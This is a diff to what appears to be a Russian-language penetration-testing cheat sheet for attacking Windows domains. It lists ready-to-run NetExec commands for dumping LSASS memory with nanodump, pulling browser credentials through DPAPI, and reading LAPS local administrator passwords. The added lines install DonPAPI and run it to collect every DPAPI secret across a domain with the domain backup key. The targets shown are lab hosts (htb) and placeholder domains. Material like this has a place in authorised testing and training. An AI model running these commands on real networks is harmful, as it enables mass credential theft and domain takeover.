@@ -114,7 +114,9 @@
 		(тоже но скрытнное)	nxc smb 10.10.11.76 -u user -p pass -M nanodump		
 
 		((получение кредов из браузеров))	mxc smb ss.banki.htb -u boss -p "password" -d banki.htb --dpapi			
-  					https://github.com/login-securite/DonPAPI
+  					pipx install git+https://github.com/login-securite/DonPAPI.git
+					donpapi collect -u admin -p 'Password123!' -d domain.local -t ALL --fetch-pvk
+					donpapi gui
 
 		(пароли локальных администраторов)	nxc ldap dc -u administrator -p password -d . -M laps		
 		
